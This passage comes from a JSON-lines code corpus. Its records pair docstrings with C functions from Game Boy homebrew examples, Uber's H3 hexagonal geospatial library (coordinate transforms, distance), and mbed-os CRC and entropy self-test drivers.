+ 1;\n\t\t\tbreak;\n\t\t\tcase ' ':\n\t\t\t\tdisp_tile[i] = OFFSET + 16 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 16 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'Y':\n\t\t\t\tdisp_tile[i] = OFFSET + 17 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 17 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'M':\n\t\t\t\tdisp_tile[i] = OFFSET + 18 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 18 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'U':\n\t\t\t\tdisp_tile[i] = OFFSET + 19 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 19 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'G':\n\t\t\t\tdisp_tile[i] = OFFSET + 20 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 20 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase '-':\n\t\t\t\tdisp_tile[i] = OFFSET + 21 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 21 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'T':\n\t\t\t\tdisp_tile[i] = OFFSET + 22 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 22 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase ',':\n\t\t\t\tdisp_tile[i] = OFFSET + 23 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 23 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'F':\n\t\t\t\tdisp_tile[i] = OFFSET + 24 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 24 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'S':\n\t\t\t\tdisp_tile[i] = OFFSET + ('5' - '0') * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + ('5' - '0') * 2 + 1;\n\t\t\tbreak;\n\t\t}\n\t\ti++;\n\t}\n}", "path": "gb-studio/buildTools/linux-x64/gbdk/examples/gb/gb-dtmf/gb-dtmf.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "// initializes sprites for pad. every pad uses 3 sprites which id's are aligned by 4\n", "func_signal": "void init_pad(UINT8 n)", "code": "{\n    set_sprite_tile(n << 2, n);\n    set_sprite_tile((n << 2) + 1, n);\n    set_sprite_tile((n << 2) + 2, n);\n}", "path": "gb-studio/buildTools/darwin-x64/gbdk/examples/gb/sgb_pong/sgb_pong.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "//------------------------------------------------------------------------------\n//--                                                                          --\n//--                           Read MOD file                                  --\n//--                                                                          --\n//------------------------------------------------------------------------------\n", "func_signal": "typedef struct __attribute__((packed))", "code": "{\n    char name[22];\n    u16  length;\n    u8   finetune; // 4 lower bits\n    u8   volume; // 0-64\n    u16  repeat_point;\n    u16  repeat_length; // Loop if length > 1\n}", "path": "gb-studio/buildTools/linux-x64/mod2gbt/mod2gbt.c", "commit_date": "2020-08-30 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/* player */\n", "func_signal": "void player()", "code": "{\n  UBYTE key;\n  UBYTE i;\n  UINT16 seed;\n\n  key = joypad();\n  /* pause */\n  if( key & J_START ) {\n    if( pf == DEF_PF ) {\n      /* Initialize the random number generator */\n      seed = DIV_REG;\n      waitpadup();\n      seed |= ((UINT16)DIV_REG << 8);\n      initarand(seed);\n      hide_msg();\n      init_score();\n      init_player();\n      init_tama();\n      init_enemy();\n      init_kirai();\n      delay( 500 );\n    } else {\n      show_pause();\n      waitpadup();\n      key = joypad();\n      while( !(key & J_START) ) {\n        key = joypad();\n        if( key & J_DOWN ) {\n          if(pl > 0)\n            pl--;\n          show_level( pl );\n          waitpadup();\n        } else if( key & J_UP ) {\n          if(pl < 8)\n            pl++;\n          show_level( pl );\n          waitpadup();\n        } else if( key & J_LEFT ) {\n          while( joypad() & J_LEFT ) {\n            if(pw > 0)\n              pw--;\n            show_score( pw );\n            delay( 250 );\n          }\n          show_score( ps );\n        } else if( key & J_RIGHT ) {\n          while( joypad() & J_RIGHT ) {\n            if(pw < 99)\n              pw++;\n            show_score( pw );\n            delay( 250 );\n          }\n          show_score( ps );\n        } else if( key & J_SELECT ) {\n          i = k_right;\n          k_right = k_left;\n          k_left  = i;\n          waitpadup();\n        }\n      }\n      waitpadup();\n      hide_msg();\n      delay( 500 );\n    }\n    return;\n  }\n\n  /* dead */\n  if( pf > 1 ) {\n    if( pf < DEF_PF ) {\n      set_sprite_tile( 0, pf*2+DEF_PC0 );\n      set_sprite_attrb( 0, foreCGB[pf*2+DEF_PC0] );\n      set_sprite_tile( 1, pf*2+DEF_PC1 );\n      set_sprite_attrb( 1, foreCGB[pf*2+DEF_PC1] );\n      pf++;\n    } else {\n      set_sprite_tile( 0, DEF_SP );\n      set_sprite_tile( 1, DEF_SP );\n      show_gover();\n    }\n    return;\n  }\n\n  /* move */\n  if( (key&J_LEFT)&&(px>MIN_PX) ) {\n    px--;\n    move_sprite( 0, px, DEF_PY ); move_sprite( 1, px+8, DEF_PY );\n  } else if( (key&J_RIGHT)&&(px<MAX_PX) ) {\n    px++;\n    move_sprite( 0, px, DEF_PY ); move_sprite( 1, px+8, DEF_PY );\n  }\n  /* shot */\n  if( key & k_left ) {  /* change J_B to J_A */\n    if( pf == 0 ) {\n      pf = 1;\n      for( i=0; i<MAX_TT; i++ ) {\n        if( tf[i] == 0 ) {\n          tf[i] = 1; tx[i] = px-4; ty[i] = DEF_PY;\n          break;\n        }\n      }\n    }\n  } else if( key & k_right ) {  /* change J_A to J_B */\n    if( pf == 0 ) {\n      pf = 1;\n      for( i=0; i<MAX_TT; i++ ) {\n        if( tf[i] == 0 ) {\n          tf[i] = 1; tx[i] = px+12; ty[i] = DEF_PY;\n          break;\n        }\n      }\n    }\n  } else if( pf == 1 ) {\n    pf = 0;\n  }\n}", "path": "gb-studio/buildTools/linux-x64/gbdk/examples/gb/dscan/dscan.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/*--------------------------------------------------------------------------*\n | main program                                                             |\n *--------------------------------------------------------------------------*/\n", "func_signal": "void main()", "code": "{\n  disable_interrupts();\n  DISPLAY_OFF;\n\n  initarand(((UINT16)DIV_REG << 8));\n\n  init_screen();\n  init_score();\n  init_player();\n  init_tama();\n  init_enemy();\n  init_kirai();\n  show_gover();\n  k_right = J_A;\n  k_left = J_B;\n  DISPLAY_ON;\n  enable_interrupts();\n\n  while(1) {\n    delay( pw );\n    player();\n    bombs();\n    enemys();\n    kirai();\n  }\n}", "path": "gb-studio/buildTools/linux-x64/gbdk/examples/gb/dscan/dscan.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/*\n\tInitialize for sound registers\n\tch1, ch2 are used for this routine.\n*/\n", "func_signal": "void init_dial()", "code": "{\n\n\tNR52_REG = 0x83U;\n\tNR51_REG = 0x00U;\n\tNR50_REG = 0x77U;\n\n\tNR24_REG = 0x87U;\n\tNR22_REG = 0xffU;\n\tNR21_REG = 0xbfU;\n\n\tNR14_REG = 0x87U;\n\tNR12_REG = 0xffU;\n\tNR11_REG = 0xbfU;\n\tNR10_REG = 0x04U;\n}", "path": "gb-studio/buildTools/linux-x64/gbdk/examples/gb/gb-dtmf/gb-dtmf.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/**\n * Find the normalized ijk coordinates of the hex centered on the indicated\n * hex at the next finer aperture 7 counter-clockwise resolution. Works in\n * place.\n *\n * @param ijk The ijk coordinates.\n */\n", "func_signal": "void _downAp7(CoordIJK* ijk)", "code": "{\n    // res r unit vectors in res r+1\n    CoordIJK iVec = {3, 0, 1};\n    CoordIJK jVec = {1, 3, 0};\n    CoordIJK kVec = {0, 1, 3};\n\n    _ijkScale(&iVec, ijk->i);\n    _ijkScale(&jVec, ijk->j);\n    _ijkScale(&kVec, ijk->k);\n\n    _ijkAdd(&iVec, &jVec, ijk);\n    _ijkAdd(ijk, &kVec, ijk);\n\n    _ijkNormalize(ijk);\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Apply callback to every cell for a given resolution, and sum the results.\n */\n", "func_signal": "double mapSumAllCells_double(int res, double (*callback)(H3Index))", "code": "{\n    H3Index* cells = getCellsAtRes(res);\n    int N = H3_EXPORT(numHexagons)(res);\n\n    double total = 0.0;\n    for (int i = 0; i < N; i++) {\n        total += (*callback)(cells[i]);\n    }\n    free(cells);\n\n    return total;\n}", "path": "h3/src/apps/applib/lib/utility.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Subtract two ijk coordinates.\n *\n * @param h1 The first set of ijk coordinates.\n * @param h2 The second set of ijk coordinates.\n * @param diff The difference of the two sets of ijk coordinates (h1 - h2).\n */\n", "func_signal": "void _ijkSub(const CoordIJK* h1, const CoordIJK* h2, CoordIJK* diff)", "code": "{\n    diff->i = h1->i - h2->i;\n    diff->j = h1->j - h2->j;\n    diff->k = h1->k - h2->k;\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Generates and prints the faceCenterPoint table.\n */\n", "func_signal": "static void generate()", "code": "{\n    printf(\"static const Vec3d faceCenterPoint[NUM_ICOSA_FACES] = {\\n\");\n    for (int i = 0; i < NUM_ICOSA_FACES; i++) {\n        GeoCoord centerCoords = faceCenterGeoCopy[i];\n        Vec3d centerPoint;\n        _geoToVec3d(&centerCoords, &centerPoint);\n        printf(\"    {%.16f, %.16f, %.16f}, // face %2d\\n\", centerPoint.x,\n               centerPoint.y, centerPoint.z, i);\n    }\n    printf(\"};\\n\");\n}", "path": "h3/src/apps/miscapps/generateFaceCenterPoint.c", "commit_date": "2020-08-07 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Find the center point in 2D cartesian coordinates of a hex.\n *\n * @param h The ijk coordinates of the hex.\n * @param v The 2D cartesian coordinates of the hex center point.\n */\n", "func_signal": "void _ijkToHex2d(const CoordIJK* h, Vec2d* v)", "code": "{\n    int i = h->i - h->k;\n    int j = h->j - h->k;\n\n    v->x = i - 0.5L * j;\n    v->y = j * M_SQRT3_2;\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Assumes `str` is big enough to hold the result.\n */\n", "func_signal": "void geoToStringDegsNoFmt(const GeoCoord* p, char* str)", "code": "{\n    sprintf(str, \"%.9lf %.9lf\", H3_EXPORT(radsToDegs)(p->lat),\n            H3_EXPORT(radsToDegs)(p->lon));\n}", "path": "h3/src/apps/applib/lib/utility.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Calculates the magnitude of a 2D cartesian vector.\n * @param v The 2D cartesian vector.\n * @return The magnitude of the vector.\n */\n", "func_signal": "double _v2dMag(const Vec2d* v)", "code": "{ return sqrt(v->x * v->x + v->y * v->y); }\n\n/**\n * Finds the intersection between two lines. Assumes that the lines intersect\n * and that the intersection is not at an endpoint of either line.\n * @param p0 The first endpoint of the first line.\n * @param p1 The second endpoint of the first line.\n * @param p2 The first endpoint of the second line.\n * @param p3 The second endpoint of the second line.\n * @param inter The intersection point.\n */\nvoid _v2dIntersect(const Vec2d* p0, const Vec2d* p1, const Vec2d* p2,\n                   const Vec2d* p3, Vec2d* inter) {\n    Vec2d s1, s2;\n    s1.x = p1->x - p0->x;\n    s1.y = p1->y - p0->y;\n    s2.x = p3->x - p2->x;\n    s2.y = p3->y - p2->y;\n\n    float t;\n    t = (s2.x * (p0->y - p2->y) - s2.y * (p0->x - p2->x)) /\n        (-s2.x * s1.y + s1.x * s2.y);\n\n    inter->x = p0->x + (t * s1.x);\n    inter->y = p0->y + (t * s1.y);\n}", "path": "h3/src/h3lib/lib/vec2d.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Rotates ijk coordinates 60 degrees clockwise. Works in place.\n *\n * @param ijk The ijk coordinates.\n */\n", "func_signal": "void _ijkRotate60cw(CoordIJK* ijk)", "code": "{\n    // unit vector rotations\n    CoordIJK iVec = {1, 0, 1};\n    CoordIJK jVec = {1, 1, 0};\n    CoordIJK kVec = {0, 1, 1};\n\n    _ijkScale(&iVec, ijk->i);\n    _ijkScale(&jVec, ijk->j);\n    _ijkScale(&kVec, ijk->k);\n\n    _ijkAdd(&iVec, &jVec, ijk);\n    _ijkAdd(ijk, &kVec, ijk);\n\n    _ijkNormalize(ijk);\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * @brief haversineDistance finds the\n * [great-circle distance](https://en.wikipedia.org/wiki/Great-circle_distance)\n * between two points on a sphere.\n * @see https://en.wikipedia.org/wiki/Haversine_formula.\n *\n * Parameters are the latitude and longitude of the first and second point in\n * radians, respectively.\n *\n * @return the great-circle distance in kilometers.\n */\n", "func_signal": "double haversineDistance(double th1, double ph1, double th2, double ph2)", "code": "{\n    double dx, dy, dz;\n    ph1 -= ph2;\n\n    dz = sin(th1) - sin(th2);\n    dx = cos(ph1) * cos(th1) - cos(th2);\n    dy = sin(ph1) * cos(th1);\n    return asin(sqrt(dx * dx + dy * dy + dz * dz) / 2) * 2 * R;\n}", "path": "h3/examples/distance.c", "commit_date": "2018-08-10 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Convert IJK coordinates to cube coordinates, in place\n * @param ijk Coordinate to convert\n */\n", "func_signal": "void ijkToCube(CoordIJK* ijk)", "code": "{\n    ijk->i = -ijk->i + ijk->k;\n    ijk->j = ijk->j - ijk->k;\n    ijk->k = -ijk->i - ijk->j;\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Move nonzero elements to the front of array `a` of length `n`.\n *\n * Loop invariant: Everything *before* `i` or *after* `j` is \"done\".\n * Move `i` and `j` inwards until they equal, and exit.\n * You can move `i` forward until there's a zero in front of it.\n * You can move `j` backward until there's a nonzero to the left of it.\n * Anything to the right of `j` is \"junk\" that can be reallocated.\n *\n * Before:\n *   | a | b | 0 | c | d | ... |\n *           ^           ^\n *           i           j\n * After:\n *   | a | b | d | c | d | ... |\n *           ^       ^\n *           i       j\n *\n * todo: should this function be in the public API?\n * todo: add tests for this function\n *\n * @param   a  H3Index array to whose elements will be moved\n * @param   n  length of the input array\n * @return     number of nonzero elements (length of new array); can reallocate\n *             memory after this point\n */\n", "func_signal": "size_t packNonzeros(H3Index* a, size_t n)", "code": "{\n    size_t i = 0;\n    size_t j = n;\n\n    while (i < j) {\n        // move j to the left until the first nonzero\n        if (a[j - 1] == 0) {\n            j -= 1;\n            continue;\n        }\n\n        // move i to the right until the first zero\n        if (a[i] != 0) {\n            i += 1;\n            continue;\n        }\n\n        // if we get to this point, we know:\n        // a[i] == 0\n        // a[j-1] != 0\n        // i < j\n        // so we can swap! (actually, move a[j-1] -> a[i])\n        a[i] = a[j - 1];\n        j -= 1;\n    }\n\n    return i;\n}", "path": "h3/src/apps/applib/lib/utility.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Find the normalized ijk coordinates of the indexing parent of a cell in a\n * clockwise aperture 7 grid. Works in place.\n *\n * @param ijk The ijk coordinates.\n */\n", "func_signal": "void _upAp7r(CoordIJK* ijk)", "code": "{\n    // convert to CoordIJ\n    int i = ijk->i - ijk->k;\n    int j = ijk->j - ijk->k;\n\n    ijk->i = (int)lroundl((2 * i + j) / 7.0L);\n    ijk->j = (int)lroundl((3 * j - i) / 7.0L);\n    ijk->k = 0;\n    _ijkNormalize(ijk);\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Finds the distance between the two coordinates. Returns result.\n *\n * @param c1 The first set of ijk coordinates.\n * @param c2 The second set of ijk coordinates.\n */\n", "func_signal": "int ijkDistance(const CoordIJK* c1, const CoordIJK* c2)", "code": "{\n    CoordIJK diff;\n    _ijkSub(c1, c2, &diff);\n    _ijkNormalize(&diff);\n    CoordIJK absDiff = {abs(diff.i), abs(diff.j), abs(diff.k)};\n    return MAX(absDiff.i, MAX(absDiff.j, absDiff.k));\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Find the normalized ijk coordinates of the hex in the specified digit\n * direction from the specified ijk coordinates. Works in place.\n *\n * @param ijk The ijk coordinates.\n * @param digit The digit direction from the original ijk coordinates.\n */\n", "func_signal": "void _neighbor(CoordIJK* ijk, Direction digit)", "code": "{\n    if (digit > CENTER_DIGIT && digit < NUM_DIGITS) {\n        _ijkAdd(ijk, &UNIT_VECS[digit], ijk);\n        _ijkNormalize(ijk);\n    }\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Uniformly scale ijk coordinates by a scalar. Works in place.\n *\n * @param c The ijk coordinates to scale.\n * @param factor The scaling factor.\n */\n", "func_signal": "void _ijkScale(CoordIJK* c, int factor)", "code": "{\n    c->i *= factor;\n    c->j *= factor;\n    c->k *= factor;\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Call the callback for every index at the given resolution in a\n * specific base cell\n */\n", "func_signal": "void iterateBaseCellIndexesAtRes(int res, void (*callback)(H3Index),\n                                 int baseCell)", "code": "{\n    H3Index bc = H3_INIT;\n    H3_SET_MODE(bc, H3_HEXAGON_MODE);\n    H3_SET_RESOLUTION(bc, 0);\n    H3_SET_BASE_CELL(bc, baseCell);\n    int childrenSz = H3_EXPORT(maxUncompactSize)(&bc, 1, res);\n    H3Index* children = calloc(childrenSz, sizeof(H3Index));\n    H3_EXPORT(uncompact)(&bc, 1, children, childrenSz, res);\n\n    for (int j = 0; j < childrenSz; j++) {\n        if (children[j] == H3_NULL) {\n            continue;\n        }\n\n        (*callback)(children[j]);\n    }\n\n    free(children);\n}", "path": "h3/src/apps/applib/lib/utility.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Find the normalized ijk coordinates of the hex centered on the indicated\n * hex at the next finer aperture 3 clockwise resolution. Works in place.\n *\n * @param ijk The ijk coordinates.\n */\n", "func_signal": "void _downAp3r(CoordIJK* ijk)", "code": "{\n    // res r unit vectors in res r+1\n    CoordIJK iVec = {2, 1, 0};\n    CoordIJK jVec = {0, 2, 1};\n    CoordIJK kVec = {1, 0, 2};\n\n    _ijkScale(&iVec, ijk->i);\n    _ijkScale(&jVec, ijk->j);\n    _ijkScale(&kVec, ijk->k);\n\n    _ijkAdd(&iVec, &jVec, ijk);\n    _ijkAdd(ijk, &kVec, ijk);\n\n    _ijkNormalize(ijk);\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Array of all cells at a given resolution.\n *\n * @param   res  resolution\n *\n * @return       array of H3 cells at resolution res\n */\n", "func_signal": "H3Index* getCellsAtRes(int res)", "code": "{\n    int num0 = H3_EXPORT(res0IndexCount)();\n    H3Index* cells0 = calloc(num0, sizeof(H3Index));\n    H3_EXPORT(getRes0Indexes)(cells0);\n\n    int numRes = H3_EXPORT(maxUncompactSize)(cells0, num0, res);\n\n    H3Index* cellsRes = calloc(numRes, sizeof(H3Index));\n    H3_EXPORT(uncompact)(cells0, num0, cellsRes, numRes, res);\n\n    free(cells0);\n\n    numRes = packNonzeros(cellsRes, numRes);\n    cellsRes = realloc(cellsRes, numRes * sizeof(H3Index));\n\n    return cellsRes;\n}", "path": "h3/src/apps/applib/lib/utility.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Find the normalized ijk coordinates of the hex centered on the indicated\n * hex at the next finer aperture 3 counter-clockwise resolution. Works in\n * place.\n *\n * @param ijk The ijk coordinates.\n */\n", "func_signal": "void _downAp3(CoordIJK* ijk)", "code": "{\n    // res r unit vectors in res r+1\n    CoordIJK iVec = {2, 0, 1};\n    CoordIJK jVec = {1, 2, 0};\n    CoordIJK kVec = {0, 1, 2};\n\n    _ijkScale(&iVec, ijk->i);\n    _ijkScale(&jVec, ijk->j);\n    _ijkScale(&kVec, ijk->k);\n\n    _ijkAdd(&iVec, &jVec, ijk);\n    _ijkAdd(ijk, &kVec, ijk);\n\n    _ijkNormalize(ijk);\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * Transforms coordinates from the IJ coordinate system to the IJK+ coordinate\n * system.\n *\n * @param ij The input IJ coordinates\n * @param ijk The output IJK+ coordinates\n */\n", "func_signal": "void ijToIjk(const CoordIJ* ij, CoordIJK* ijk)", "code": "{\n    ijk->i = ij->i;\n    ijk->j = ij->j;\n    ijk->k = 0;\n\n    _ijkNormalize(ijk);\n}", "path": "h3/src/h3lib/lib/coordijk.c", "commit_date": "2020-04-27 00:00:00", "repo_name": "uber/h3", "stars": 4514, "license": "apache-2.0", "language": "c", "size": 42324}
{"docstring": "/**\n * @brief       interrupt handler used by the software DMA channel driving the CRC\n *\n * @details     interrupt handler used by the software DMA channel driving the CRC\n *              ADI_DMA_CRC_ISR is a macro with the final interrupt handler name\n *              being DMA_SIP0_Int_Handler, ..., DMA_SIP7_Int_Handler, depending\n *              on the software DMA channel driving the CRC.\n */\n", "func_signal": "void ADI_DMA_CRC_ISR(void)", "code": "{\n    ISR_PROLOG();\n\n    if (ADI_CRC_DEVICE_IN_USE(0))\n    {\n        ADI_CRC_DEVICE * pDevice = HDL_TO_DEVICE_PTR(crc_device_info[0].hDevice);\n        if (NULL != pDevice)\n        {\n            uint8_t *pData = (uint8_t *)(pDevice->pRemainingData);\n            uint32_t NumBytes = pDevice->RemainingBytes;\n            uint32_t NumBits = pDevice->RemainingBits;\n            bool finishing = (NumBytes < 4u);\n\n            if (!finishing)\n            {\n                /* there's enough data left for another DMA transfer */\n                ADI_CRC_RESULT result = pDevice->pfSubmitBuffer(pDevice, pData, NumBytes, NumBits);\n                if (ADI_CRC_SUCCESS != result)\n                {\n                    /* buffer submission failed: complete the task through core driven operations */\n                    finishing = true;\n                }\n            }\n\n            if (finishing)\n            {\n                /* There are a very few bytes/bits left to be processed or\n                 * a DMA transfer request could not be sent */\n                crc_CalculateCrcForRemaining(pDevice, pData, NumBytes, NumBits);\n\n                /* if a callback function is registered with the interrupt handler\n                 * associated with the software DMA channel driving the CRC */\n                if(pDevice->pfCallback != NULL)\n                {\n                    pDevice->pfCallback(pDevice->pCBParam, (uint32_t) ADI_CRC_EVENT_BUFFER_PROCESSED, NULL);\n                }\n                pDevice->eCrcOpStatus = ADI_CRC_OP_IDLE;        /* CRC back in idle state */\n\n            }\n        }\n    }\n\n#if defined(ADI_CYCLECOUNT_CRC_ISR_ENABLED) && (ADI_CYCLECOUNT_CRC_ISR_ENABLED == 1u)\n    ADI_CYCLECOUNT_STORE(ADI_CYCLECOUNT_ISR_CRC);    \n#endif\n\n    ISR_EPILOG();\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/*\n * @brief       Starts core driven CRC operation.\n *\n * @param [in]  pDevice         Pointer to CRC device\n * @param [in]  pCrcBuf         Address of data buffer.\n * @param [in]  NumBytes        Number of bytes in data buffer.\n * @param [in]  NumBits         Number of bits, 0 to 7, in the last partial byte\n *                              in CRC data buffer\n *\n * @return      Status\n *              - ADI_CRC_SUCCESS: Successfully set expected CRC result.\n */\n", "func_signal": "static ADI_CRC_RESULT crc_ExecuteCoreDrivenOperation(\n    ADI_CRC_DEVICE      *pDevice,\n    void                *pCrcBuf,\n    uint32_t            NumBytes,\n    uint32_t            NumBits)", "code": "{\n    ADI_CRC_RESULT result = ADI_CRC_SUCCESS;\n    uint8_t *pData = (uint8_t *)pCrcBuf;        /* initialize the pointer to data to the start of the data buffer */\n    uint32_t lsbFirst = pDevice->pReg->CTL & BITM_CRC_CTL_LSBFIRST;\n\n    pDevice->pReg->CTL |= (BITM_CRC_CTL_EN);    /*! enable CRC peripheral */\n\n    if (((uint32_t)pData & 0x3u) != 0u)         /* If the buffer is not 4-byte aligned */\n    {\n        /* feed the CRC byte per byte as long as there are data in the input buffer AND\n         * the data left in the buffer are not 4-byte aligned */\n        while ((NumBytes > 0u) && (((uint32_t)pData & 0x3u) != 0u))\n        {\n            pDevice->pReg->IPBYTE = *pData;     /* feed the CRC with the first byte in the buffer */\n            pData++;                            /* get the next byte to feed into CRC */\n            NumBytes--;                         /* decrease the number of bytes to be processed */\n        }\n    }\n\n    /* data left in the input buffer are now 4-byte aligned */\n\n    while (NumBytes >= 4u)                      /* if the number of bytes left is greater than 4 bytes */\n    {                                           /* feed CRC peripheral with 4-byte data */\n        uint32_t nData;                         /* 32-bit variable to be used to feed the CRC peripheral */\n\n        /*\n         * Here we assume memory is little endian. We need change the following\n         * code if we produce a Cortex-M processor with big endian memory.\n         */\n        if (lsbFirst != 0u)\n        {\n            nData = pData[3];\n            nData = (nData << 8) | pData[2];\n            nData = (nData << 8) | pData[1];\n            nData = (nData << 8) | pData[0];\n        }\n        else\n        {\n            nData = pData[0];\n            nData = (nData << 8) | pData[1];\n            nData = (nData << 8) | pData[2];\n            nData = (nData << 8) | pData[3];\n        }\n        pDevice->pReg->IPDATA = nData;          /* feed the CRC peripheral with 32-bit data input */\n        pData += 4;                             /* move the data pointer in the data buffer */\n        NumBytes -= 4u;                         /* decrease the number of data to be processed */\n    }\n\n    while (NumBytes > 0u)                       /* if the number of data left in the input buffer is smaller than 4 */\n    {\n        pDevice->pReg->IPBYTE = *pData;         /* feed the CRC peripheral with the remaining bytes */\n        pData++;                                /* move the pointer to the next byte in input data buffer */\n        NumBytes--;                             /* decrease the number of data to be fed into the CRC peripheral */\n    }\n\n    if (NumBits > 0u)                           /* if the last byte is a partial byte containing less than 8 bits */\n    {\n        pDevice->pReg->IPBITS[NumBits] = *pData;/* feed the CRC peripheral with the remaining bits (use IPBITS[N] to feed N bits) */\n    }\n\n    pDevice->pReg->CTL &= ~(BITM_CRC_CTL_EN);   /* All the data have been fed into the CRC peripheral : disable it */\n    pDevice->eCrcOpStatus = ADI_CRC_OP_IDLE;    /* CRC back in idle state */\n    return result;\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/*\n * A test to ensure hat the entropy sources are functioning correctly\n * and there is no obvious failure. The test performs the following checks:\n *  - The entropy source is not providing only 0s (all bits unset) or 1s (all\n *    bits set).\n *  - The entropy source is not providing values in a pattern. Because the\n *    hardware could be providing data in an arbitrary length, this check polls\n *    the hardware entropy source twice and compares the result to ensure they\n *    are not equal.\n *  - The error code returned by the entropy source is not an error.\n */\n", "func_signal": "int mbedtls_entropy_source_self_test( int verbose )", "code": "{\n    int ret = 0;\n    unsigned char buf0[2 * sizeof( unsigned long long int )];\n    unsigned char buf1[2 * sizeof( unsigned long long int )];\n\n    if( verbose != 0 )\n        mbedtls_printf( \"  ENTROPY_BIAS test: \" );\n\n    memset( buf0, 0x00, sizeof( buf0 ) );\n    memset( buf1, 0x00, sizeof( 